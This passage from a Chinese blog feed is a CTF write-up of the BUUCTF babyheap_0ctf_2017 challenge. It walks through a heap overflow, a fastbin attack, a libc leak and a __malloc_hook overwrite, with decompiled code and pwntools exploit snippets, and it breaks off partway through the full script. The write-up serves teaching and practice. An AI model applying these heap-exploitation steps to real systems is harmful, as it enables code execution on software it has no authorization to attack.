class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>补充：<br><img src="/images/%E5%A0%86%E6%BC%8F%E6%B4%9Eoffbyone/4.png"><br>再扣去头部0x10就是0xb<br><img src="/images/%E5%A0%86%E6%BC%8F%E6%B4%9Eoffbyone/5.png"><br>结束</p>]]></content>
      
      
      
        <tags>
            
            <tag> pwn原理讲解 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>buuctf_babyheap_0ctf_2017</title>
      <link href="/2023/01/27/buuctf-babyheap-0ctf-2017/"/>
      <url>/2023/01/27/buuctf-babyheap-0ctf-2017/</url>
      
        <content type="html"><![CDATA[<h1 id="0x01-buuctf-babyheap-0ctf-2017"><a href="#0x01-buuctf-babyheap-0ctf-2017" class="headerlink" title="0x01 buuctf_babyheap_0ctf_2017"></a>0x01 buuctf_babyheap_0ctf_2017</h1><hr><p>牢骚：第一次做堆题，改exp改了特别长时间，结合别的师傅的wp才做出来的，心累……写篇博客当做里程碑。<br>如果对基础知识不太懂的看看这篇博客，这里不作过多赘述：<a href="https://blog.csdn.net/weixin_43847969/article/details/104897249">知识补充</a><br>综合网上师傅和<strong>学长大大</strong>的wp，本题提供两种做法</p><hr><p>本题涉及到几个知识点：</p><ul><li>堆溢出</li><li>fastbin attack</li><li>double free</li><li>堆泄露libc地址</li><li>pwndbg如何快速找到fake chunk</li><li>__malloc_hook函数的利用</li><li>堆块重叠<br>环境：Ubuntu16.04</li></ul><hr><h2 id="第一种："><a href="#第一种：" class="headerlink" title="第一种："></a>第一种：</h2><h4 id="0x01-malloc-hook函数攻击原理："><a href="#0x01-malloc-hook函数攻击原理：" class="headerlink" title="0x01 __malloc_hook函数攻击原理："></a>0x01 __malloc_hook函数攻击原理：</h4><hr><ul><li>像malloc、free、realloc这类函数在执行前会先检查对应的hook函数，如果hook函数为空，则继续执行对应的函数，如果不为空，则跳转到hook中的值对应的地址位置执行。（例如hook函数中如果存的是one_gatget的地址则执行one_gatget）</li></ul><hr><h4 id="unsortbin-泄露libc地址"><a href="#unsortbin-泄露libc地址" class="headerlink" title="unsortbin 泄露libc地址"></a>unsortbin 泄露libc地址</h4><ul><li>对于libc-2.23.so而言，当unsortedbin中只有一个freed chunk时，这个freed chunk的fd和bk指针都指向libc中的一个地址（一般是&lt;main_arena+88&gt;），这个偏移也可以算出是0x3c4b78。（小版本是0x3c3b78）而main_arena是libc的data段中，是全局静态变量，所以偏移也是固定的，根据这些就可以计算出libc的基地址了，所以重点是当small chunk释放时，<strong>能否读出fd 或者 bk的值</strong>。</li></ul><hr><h2 id="0x02-解题思路："><a href="#0x02-解题思路：" class="headerlink" title="0x02 解题思路："></a>0x02 解题思路：</h2><h3 id="0x02（1）-代码审计："><a href="#0x02（1）-代码审计：" class="headerlink" title="0x02（1） 代码审计："></a>0x02（1） 代码审计：</h3><hr><p>堆题的保护机制一般是全开的，如下：<br><img src="/images/buuctf-babyheap-0ctf-2017/1.png"><br>拖进ida：</p><pre class="line-numbers language-c" data-language="c"><code class="language-c">_int64 __fastcall <span class="token function">main</span><span class="token punctuation">(</span>__int64 a1<span class="token punctuation">,</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token operator">*</span>a2<span class="token punctuation">,</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token operator">*</span>a3<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>  __int64 result<span class="token punctuation">;</span> <span class="token comment">// rax</span>  <span class="token keyword">char</span> <span class="token operator">*</span>v4<span class="token punctuation">;</span> <span class="token comment">// [rsp+8h] [rbp-8h]</span>  v4 <span class="token operator">=</span> <span class="token function">sub_B70</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">while</span> <span class="token punctuation">(</span> <span class="token number">1</span> <span class="token punctuation">)</span>  <span class="token punctuation">&#123;</span>    <span class="token function">list</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">switch</span> <span class="token punctuation">(</span> <span class="token function">sub_138C</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>      <span class="token keyword">case</span> <span class="token number">1LL</span><span class="token operator">:</span>        <span class="token function">allocate</span><span class="token punctuation">(</span><span class="token punctuation">(</span>__int64<span class="token punctuation">)</span>v4<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">break</span><span class="token punctuation">;</span>      <span class="token keyword">case</span> <span class="token number">2LL</span><span class="token operator">:</span>        <span class="token function">edit</span><span class="token punctuation">(</span>v4<span class="token punctuation">,</span> a2<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> result<span class="token punctuation">;</span>      <span class="token keyword">case</span> <span class="token number">3LL</span><span class="token operator">:</span>        <span class="token function">free_0</span><span class="token punctuation">(</span><span class="token punctuation">(</span>__int64<span class="token punctuation">)</span>v4<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">break</span><span class="token punctuation">;</span>      <span class="token keyword">case</span> <span class="token number">4LL</span><span class="token operator">:</span>        <span class="token function">show</span><span class="token punctuation">(</span><span class="token punctuation">(</span>__int64<span class="token punctuation">)</span>v4<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">break</span><span class="token punctuation">;</span>      <span class="token keyword">case</span> <span class="token number">5LL</span><span class="token operator">:</span>        <span class="token keyword">return</span> <span class="token number">0LL</span><span class="token punctuation">;</span>      <span class="token keyword">default</span><span class="token operator">:</span>        <span class="token keyword">continue</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>  <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><em><strong>allocate</strong></em></p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">void</span> __fastcall <span class="token function">sub_D48</span><span class="token punctuation">(</span>__int64 a1<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>  <span class="token keyword">int</span> i<span class="token punctuation">;</span> <span class="token comment">// [rsp+10h] [rbp-10h]</span>  <span class="token keyword">int</span> v2<span class="token punctuation">;</span> <span class="token comment">// [rsp+14h] [rbp-Ch]</span>  <span class="token keyword">void</span> <span class="token operator">*</span>v3<span class="token punctuation">;</span> <span class="token comment">// [rsp+18h] [rbp-8h]</span>  <span class="token keyword">for</span> <span class="token punctuation">(</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;=</span> <span class="token number">15</span><span class="token punctuation">;</span> <span class="token operator">++</span>i <span class="token punctuation">)</span>  <span class="token punctuation">&#123;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token operator">!</span><span class="token operator">*</span><span class="token punctuation">(</span>_DWORD <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token number">24LL</span> <span class="token operator">*</span> i <span class="token operator">+</span> a1<span class="token punctuation">)</span> <span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>      <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Size: "</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      v2 <span class="token operator">=</span> <span class="token function">sub_138C</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token keyword">if</span> <span class="token punctuation">(</span> v2 <span class="token operator">></span> <span class="token number">0</span> <span class="token punctuation">)</span>      <span class="token punctuation">&#123;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span> v2 <span class="token operator">></span> <span class="token number">4096</span> <span class="token punctuation">)</span>          v2 <span class="token operator">=</span> <span class="token number">4096</span><span class="token punctuation">;</span>        v3 <span class="token operator">=</span> <span class="token function">calloc</span><span class="token punctuation">(</span>v2<span class="token punctuation">,</span> <span class="token number">1uLL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token operator">!</span>v3 <span class="token punctuation">)</span>          <span class="token function">exit</span><span class="token punctuation">(</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token operator">*</span><span class="token punctuation">(</span>_DWORD <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token number">24LL</span> <span class="token operator">*</span> i <span class="token operator">+</span> a1<span class="token punctuation">)</span> <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span>        <span class="token operator">*</span><span class="token punctuation">(</span>_QWORD <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span>a1 <span class="token operator">+</span> <span class="token number">24LL</span> <span class="token operator">*</span> i <span class="token operator">+</span> <span class="token number">8</span><span class="token punctuation">)</span> <span class="token operator">=</span> v2<span class="token punctuation">;</span>        <span class="token operator">*</span><span class="token punctuation">(</span>_QWORD <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span>a1 <span class="token operator">+</span> <span class="token number">24LL</span> <span class="token operator">*</span> i <span class="token operator">+</span> <span class="token number">16</span><span class="token punctuation">)</span> <span class="token operator">=</span> v3<span class="token punctuation">;</span>        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Allocate Index %d\n"</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token keyword">unsigned</span> <span class="token keyword">int</span><span class="token punctuation">)</span>i<span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token punctuation">&#125;</span>      <span class="token keyword">return</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>  <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><em><strong>edit</strong></em></p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">void</span> __fastcall __noreturn <span class="token function">edit</span><span class="token punctuation">(</span>__int64 a1<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>  <span class="token keyword">int</span> v1<span class="token punctuation">;</span> <span class="token comment">// [rsp+18h] [rbp-8h]</span>  <span class="token keyword">int</span> v2<span class="token punctuation">;</span> <span class="token comment">// [rsp+1Ch] [rbp-4h]</span>  <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Index: "</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  v1 <span class="token operator">=</span> <span class="token function">sub_138C</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span> v1 <span class="token operator">>=</span> <span class="token number">0</span> <span class="token operator">&amp;&amp;</span> v1 <span class="token operator">&lt;=</span> <span class="token number">15</span> <span class="token operator">&amp;&amp;</span> <span class="token operator">*</span><span class="token punctuation">(</span>_DWORD <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token number">24LL</span> <span class="token operator">*</span> v1 <span class="token operator">+</span> a1<span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">1</span> <span class="token punctuation">)</span>  <span class="token punctuation">&#123;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Size: "</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    v2 <span class="token operator">=</span> <span class="token function">sub_138C</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span> v2 <span class="token operator">></span> <span class="token number">0</span> <span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>      <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Content: "</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token function">sub_11B2</span><span class="token punctuation">(</span><span class="token operator">*</span><span class="token punctuation">(</span>_QWORD <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token number">24LL</span> <span class="token operator">*</span> v1 <span class="token operator">+</span> a1 <span class="token operator">+</span> <span class="token number">16</span><span class="token punctuation">)</span><span class="token punctuation">,</span> v2<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>  <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><em><strong>free</strong></em></p><pre class="line-numbers language-c" data-language="c"><code class="language-c">__int64 __fastcall <span class="token function">free_0</span><span class="token punctuation">(</span>__int64 a1<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>  __int64 result<span class="token punctuation">;</span> <span class="token comment">// rax</span>  <span class="token keyword">int</span> v2<span class="token punctuation">;</span> <span class="token comment">// [rsp+1Ch] [rbp-4h]</span>  <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Index: "</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  result <span class="token operator">=</span> <span class="token function">sub_138C</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  v2 <span class="token operator">=</span> result<span class="token punctuation">;</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token punctuation">(</span><span class="token keyword">int</span><span class="token punctuation">)</span>result <span class="token operator">>=</span> <span class="token number">0</span> <span class="token operator">&amp;&amp;</span> <span class="token punctuation">(</span><span class="token keyword">int</span><span class="token punctuation">)</span>result <span class="token operator">&lt;=</span> <span class="token number">15</span> <span class="token punctuation">)</span>  <span class="token punctuation">&#123;</span>    result <span class="token operator">=</span> <span class="token operator">*</span><span class="token punctuation">(</span><span class="token keyword">unsigned</span> <span class="token keyword">int</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token number">24LL</span> <span class="token operator">*</span> <span class="token punctuation">(</span><span class="token keyword">int</span><span class="token punctuation">)</span>result <span class="token operator">+</span> a1<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token punctuation">(</span>_DWORD<span class="token punctuation">)</span>result <span class="token operator">==</span> <span class="token number">1</span> <span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>      <span class="token operator">*</span><span class="token punctuation">(</span>_DWORD <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token number">24LL</span> <span class="token operator">*</span> v2 <span class="token operator">+</span> a1<span class="token punctuation">)</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>      <span class="token operator">*</span><span class="token punctuation">(</span>_QWORD <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token number">24LL</span> <span class="token operator">*</span> v2 <span class="token operator">+</span> a1 <span class="token operator">+</span> <span class="token number">8</span><span class="token punctuation">)</span> <span class="token operator">=</span> <span class="token number">0LL</span><span class="token punctuation">;</span>      <span class="token function">free</span><span class="token punctuation">(</span><span class="token operator">*</span><span class="token punctuation">(</span><span class="token keyword">void</span> <span class="token operator">*</span><span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token number">24LL</span> <span class="token operator">*</span> v2 <span class="token operator">+</span> a1 <span class="token operator">+</span> <span class="token number">16</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      result <span class="token operator">=</span> <span class="token number">24LL</span> <span class="token operator">*</span> v2 <span class="token operator">+</span> a1<span class="token punctuation">;</span>      <span class="token operator">*</span><span class="token punctuation">(</span>_QWORD <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span>result <span class="token operator">+</span> <span class="token number">16</span><span class="token punctuation">)</span> <span class="token operator">=</span> <span class="token number">0LL</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>  <span class="token punctuation">&#125;</span>  <span class="token keyword">return</span> result<span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><em><strong>show</strong></em></p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">int</span> __fastcall <span class="token function">sub_1051</span><span class="token punctuation">(</span>__int64 a1<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>  <span class="token keyword">int</span> result<span class="token punctuation">;</span> <span class="token comment">// eax</span>  <span class="token keyword">int</span> v2<span class="token punctuation">;</span> <span class="token comment">// [rsp+1Ch] [rbp-4h]</span>  <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Index: "</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  result <span class="token operator">=</span> <span class="token function">sub_138C</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  v2 <span class="token operator">=</span> result<span class="token punctuation">;</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span> result <span class="token operator">>=</span> <span class="token number">0</span> <span class="token operator">&amp;&amp;</span> result <span class="token operator">&lt;=</span> <span class="token number">15</span> <span class="token punctuation">)</span>  <span class="token punctuation">&#123;</span>    result <span class="token operator">=</span> <span class="token operator">*</span><span class="token punctuation">(</span>_DWORD <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token number">24LL</span> <span class="token operator">*</span> result <span class="token operator">+</span> a1<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span> result <span class="token operator">==</span> <span class="token number">1</span> <span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>      <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"Content: "</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token function">sub_130F</span><span class="token punctuation">(</span><span class="token operator">*</span><span class="token punctuation">(</span>_QWORD <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token number">24LL</span> <span class="token operator">*</span> v2 <span class="token operator">+</span> a1 <span class="token operator">+</span> <span class="token number">16</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token operator">*</span><span class="token punctuation">(</span>_QWORD <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token number">24LL</span> <span class="token operator">*</span> v2 <span class="token operator">+</span> a1 <span class="token operator">+</span> <span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      result <span class="token operator">=</span> <span class="token function">puts</span><span class="token punctuation">(</span>byte_14F1<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>  <span class="token punctuation">&#125;</span>  <span class="token keyword">return</span> result<span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>这题有个地方比较难看懂是什么意思，这里相当于一个结构体：</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token operator">*</span><span class="token punctuation">(</span>_DWORD <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token number">24LL</span> <span class="token operator">*</span> i <span class="token operator">+</span> a1<span class="token punctuation">)</span> <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span>      #<span class="token number">1</span>表示chunk已创建并且有效，后面都会检查<span class="token operator">*</span><span class="token punctuation">(</span>_QWORD <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span>a1 <span class="token operator">+</span> <span class="token number">24LL</span> <span class="token operator">*</span> i <span class="token operator">+</span> <span class="token number">8</span><span class="token punctuation">)</span> <span class="token operator">=</span> v2<span class="token punctuation">;</span> #记录chunk的大小<span class="token operator">*</span><span class="token punctuation">(</span>_QWORD <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span>a1 <span class="token operator">+</span> <span class="token number">24LL</span> <span class="token operator">*</span> i <span class="token operator">+</span> <span class="token number">16</span><span class="token punctuation">)</span> <span class="token operator">=</span> v3<span class="token punctuation">;</span>#记录chunk的申请存储地址                                     #只要free掉三个就会清零，实现用户无法访问chunk<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>由于本题有保护机制free后无法访问，首先我们的目的是让一处的chunk可以在free掉后还能被访问（这里用到double free），如下操作：</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">allocate<span class="token punctuation">(</span><span class="token number">0x10</span><span class="token punctuation">)</span> <span class="token comment">#chunk0 fastbin</span>allocate<span class="token punctuation">(</span><span class="token number">0x10</span><span class="token punctuation">)</span> <span class="token comment">#chunk1 fastbin</span>allocate<span class="token punctuation">(</span><span class="token number">0x10</span><span class="token punctuation">)</span> <span class="token comment">#chunk2 fastbin</span>allocate<span class="token punctuation">(</span><span class="token number">0x10</span><span class="token punctuation">)</span> <span class="token comment">#chunk3 fastbin</span>allocate<span class="token punctuation">(</span><span class="token number">0x80</span><span class="token punctuation">)</span> <span class="token comment">#chunk4 smallbin</span>free<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>free<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>先申请几个堆块，free掉两个fastbin，因为fastbin是单向链表并且服从FILO，<strong>所以第二个free掉的堆块fd指针会指向第一个free的堆块</strong><br>该题不太一样的是先allocate申请大小然后再edit填充内容，其他题目很多都是add直接分配chunk直接填充内容，这里就有一个溢出因为chunk大小由我们规定，输入多少也由我们规定<strong>可以实现无限溢出</strong>。</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">payload<span class="token operator">=</span>p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token number">3</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0x21</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token number">3</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0x21</span><span class="token punctuation">)</span><span class="token operator">+</span>p8<span class="token punctuation">(</span><span class="token number">0x80</span><span class="token punctuation">)</span>edit<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span>payload<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>在chunk0处输入，把 chunk 2 的fd指针覆盖为 chunk 4 的地址，只用修改低8字节即可，这样chunk2就从指向chunk1变为指向chunk4，且chunk4相当于处于“’free状态”可再次被申请，这时就有两个指针指向了同一个chunk</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">payload<span class="token operator">=</span>p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token number">3</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0x21</span><span class="token punctuation">)</span>edit<span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">,</span>payload<span class="token punctuation">)</span>allocate<span class="token punctuation">(</span><span class="token number">0x10</span><span class="token punctuation">)</span>allocate<span class="token punctuation">(</span><span class="token number">0x10</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>我们等下要 malloc 拿到 chunk 4 ，可是 malloc fastbin 有检查， chunksize 必须与相应的 fastbin_index 匹配，所以我们覆盖 chunk 4 的 size 为 fastbin 大小来通过检查，申请两次可以拿到chunk4<br>因为本题allocate的分配机制是从头开始检查哪个chunk是free状态，如果是就把它占用，所以重新分配的chunk分别给了chunk1，而chunk4给了chunk2，相当于两个堆块用的同一个空间</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">payload<span class="token operator">=</span>p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token number">3</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0x91</span><span class="token punctuation">)</span>edit<span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">,</span>payload<span class="token punctuation">)</span>allocate<span class="token punctuation">(</span><span class="token number">0x80</span><span class="token punctuation">)</span>free<span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">)</span>show<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>我们需要的是它作为smallbin时的身份于是恢复其size大小，申请回来再释放掉**(释放时，是当做small bin释放的)<strong>此时chunk4的fd指针就会指向libc的main_arena某处，但是我们无法用show来查看chunk4，不过刚刚做的努力就体现在这，</strong>因为chunk2也使用chunk4的空间**，我们就可以通过show chunk2的内容看到chunk4的fd指针内容</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">leak<span class="token operator">=</span>u64<span class="token punctuation">(</span>io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'\x7f'</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">6</span><span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span><span class="token string">b'\x00'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment">#接收\x7f在内的向左六个字节，用\x00补齐八个字节</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'leak:'</span><span class="token operator">+</span><span class="token builtin">hex</span><span class="token punctuation">(</span>leak<span class="token punctuation">)</span><span class="token punctuation">)</span>libc_base<span class="token operator">=</span>leak<span class="token operator">-</span><span class="token number">0x3c4b78</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'libc_base:'</span><span class="token operator">+</span><span class="token builtin">hex</span><span class="token punctuation">(</span>libc_base<span class="token punctuation">)</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>算libc地址如上：<br><img src="/images/buuctf-babyheap-0ctf-2017/2.png"><br>用pwndbg快速找到在__malloc_hook旁边符合条件的fake_chunk指令如上：<br><img src="/images/buuctf-babyheap-0ctf-2017/3.png"><br>用pwndbg找到libc地址和__malloc_hook的地址用于计算偏移：<br><img src="/images/buuctf-babyheap-0ctf-2017/4.png"><br>用pwndbg算偏移如上：</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">fake_chunk<span class="token operator">=</span>libc_base<span class="token operator">+</span><span class="token number">0x3c4aed</span>allocate<span class="token punctuation">(</span><span class="token number">0x60</span><span class="token punctuation">)</span>free<span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">)</span>edit<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">,</span>p64<span class="token punctuation">(</span>fake_chunk<span class="token punctuation">)</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>再次申请一个chunk被分配到chunk4的位置，将其free掉，用chunk2来修改chunk4的fd为fake_chunk的地址</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">allocate<span class="token punctuation">(</span><span class="token number">0x60</span><span class="token punctuation">)</span><span class="token comment">#chunk5</span>allocate<span class="token punctuation">(</span><span class="token number">0x60</span><span class="token punctuation">)</span><span class="token comment">#chunk6</span>payload<span class="token operator">=</span><span class="token string">b'a'</span><span class="token operator">*</span><span class="token number">0x13</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>libc_base<span class="token operator">+</span><span class="token number">0x4526a</span><span class="token punctuation">)</span><span class="token comment">#one_gadget</span>edit<span class="token punctuation">(</span><span class="token number">6</span><span class="token punctuation">,</span>payload<span class="token punctuation">)</span>allocate<span class="token punctuation">(</span><span class="token number">0x10</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>申请两个chunk，chunk6拿到fake_chunk,并且对chunk6进行输入覆盖__mallo_hook,再次申请就相当于执行one_gadget<br>完整exp：</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span><span class="token operator">*</span>io<span class="token operator">=</span>remote<span class="token punctuation">(</span><span class="token string">'node4.buuoj.cn'</span><span class="token punctuation">,</span><span class="token number">26165</span><span class="token punctuation">)</span><span class="token comment">#io=process('./babyheap')</span>libc<span class="token operator">=</span>ELF<span class="token punctuation">(</span><span class="token string">'/lib/x86_64-linux-gnu/libc-2.23.so'</span><span class="token punctuation">)</span><span class="token comment">#context.log_level='debug'</span><span class="token keyword">def</span> <span class="token function">choice</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token punctuation">:</span>io<span 